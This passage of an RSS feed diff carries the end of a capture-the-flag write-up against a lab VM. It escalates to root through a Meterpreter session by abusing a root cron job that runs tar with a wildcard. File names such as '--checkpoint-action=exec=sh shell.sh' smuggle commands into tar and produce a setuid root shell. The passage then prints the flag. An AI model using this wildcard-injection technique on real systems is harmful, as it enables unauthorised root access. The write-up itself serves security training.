+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; ls /home/rene
+40777/rwxrwxrwx   4096  dir   2015-10-02 21:27:01 +0100  backup
+
+meterpreter &amp;gt; ls /home/rene/backup
+100644/rw-r--r--  98925  fil   2015-10-02 21:25:01 +0100  backup.tar.gz
+100644/rw-r--r--  30263  fil   2015-10-02 21:27:01 +0100  sys-10582.BAK
+100644/rw-r--r--  17323  fil   2015-10-02 21:27:01 +0100  sys-4811.BAK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After some time, we notice that &lt;code&gt;sys-*&lt;/code&gt; files are created and removed periodically, and that the timestamp on &lt;code&gt;backup.tar.gz&lt;/code&gt; changes.  This leads us to believe some sort of scheduled job is running, so we go in search for cronjobs.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; cat /etc/crontab
+
+* * * * * root /root/create_backup.sh
+*/5 * * * * root /usr/bin/compress.sh
+
+meterpreter &amp;gt; ls /usr/bin/compress.sh
+100755/rwxr-xr-x  190  fil  2015-07-06 02:12:03 +0100  /usr/bin/compress.sh
+
+meterpreter &amp;gt; cat /usr/bin/compress.sh
+#!/bin/sh
+
+rm -f /home/rene/backup/backup.tar.gz
+cd /home/rene/backup
+tar cfz /home/rene/backup/backup.tar.gz *
+chown rene:rene /home/rene/backup/backup.tar.gz
+rm -f /home/rene/backup/*.BAK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So every minute &lt;code&gt;/root/create_backup.sh&lt;/code&gt; is run, and every 5 minutes &lt;code&gt;/usr/bin/compress.sh&lt;/code&gt; runs.  This second script is world readable, so we can inspect it.  What we see is a classic tar command injection vulnerability due to the wildcard.  This backup directory is world writeable - so we can slap our exploit in easily.&lt;/p&gt;
+
+&lt;p&gt;I created a simple script that would copy &lt;code&gt;sh&lt;/code&gt; and set the suid bit.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; edit shell.sh
+cp /bin/sh /tmp/sh
+chmod 4777 /tmp/sh
+(:wq)
+
+meterpreter &amp;gt; edit &amp;quot;--checkpoint-action=exec=sh shell.sh&amp;quot;
+(:wq)
+meterpreter &amp;gt; edit &amp;quot;--checkpoint=1&amp;quot;
+(:wq)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Sit back, and&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; ls /tmp
+104777/rwxrwxrwx  125400  fil   2015-10-02 21:30:01 +0100  sh
+
+meterpreter &amp;gt; execute -f /tmp/sh -c -i
+whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:378c41c5fac16f89c224b95690922b7e&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;                                                                   .aMMMMMMMMn.  ,aMMMMn.
+                                                                 .aMccccccccc*YMMn.    `Mb
+                                                                aMccccccccccccccc*Mn    MP
+                                                               .AMMMMn.   MM `*YMMY*ccaM*
+                                                              dM*  *YMMb  YP        `cMY
+                                                              YM.  .dMMP   aMn.     .cMP
+                                                               *YMMn.     aMMMMMMMMMMMY&#39;
+                                                                .&#39;YMMb.           ccMP
+                                                             .dMcccccc*Mc....cMb.cMP&#39;
+                                                           .dMMMMb;cccc*Mbcccc,IMMMMMMMn.
+                                                          dY*&#39;  &#39;*M;ccccMM..dMMM..MP*cc*Mb
+                                                          YM.    ,MbccMMMMMMMMMMMM*cccc;MP
+                                                           *Mbn;adMMMMMMMMMMMMMMMIcccc;M*
+                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP
+                                                          Yb;cc;dMMMMMMMMMMMP*&#39;  *YMMP*
+                                                           *YMMMPYMMMMMMP*&#39;          curchack
+                                                       +####################################+
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       +----------------------------------+-+
+                                                        ####################################
+                                                             |======                  |
+                                                             |======                  |
+                                                             |=====                   |
+                                                             |====                    |
+                                                             |                        |
+                                                             +                        +
+
+ .d8888b.                 d8b          d8b               888                                                                    d8b
+d88P  Y88b                Y8P          88P               888                                                                    Y8P
+888    888                             8P                888
+888        .d88b.  .d8888b888   88888b.&amp;quot;  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.
+888       d8P  Y8bd88P&amp;quot;   888   888 &amp;quot;88b d8P  Y8b88K     888      888 &amp;quot;88b    &amp;quot;88b88K        888  888888 &amp;quot;88bd8P  Y8b   888 &amp;quot;88b888888 &amp;quot;88bd8P  Y8b
+888    88888888888888     888   888  888 88888888&amp;quot;Y8888b.888      888  888.d888888&amp;quot;Y8888b.   888  888888  88888888888   888  888888888  88888888888
+Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b
+ &amp;quot;Y8888P&amp;quot;  &amp;quot;Y8888  &amp;quot;Y8888P888   888  888  &amp;quot;Y8888  88888P&#39; &amp;quot;Y888   88888P&amp;quot; &amp;quot;Y888888 88888P&#39;    &amp;quot;Y88888888  888 &amp;quot;Y8888    88888P&amp;quot; 88888888P&amp;quot;  &amp;quot;Y8888Y8P
+                                                                  888                                                   888        888
+                                                                  888                                                   888        888
+                                                                  888                                                   888        888
+Well Done!
+Here&#39;s your flag: 0089cd4f9ae79402cdd4e7b8931892b7
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
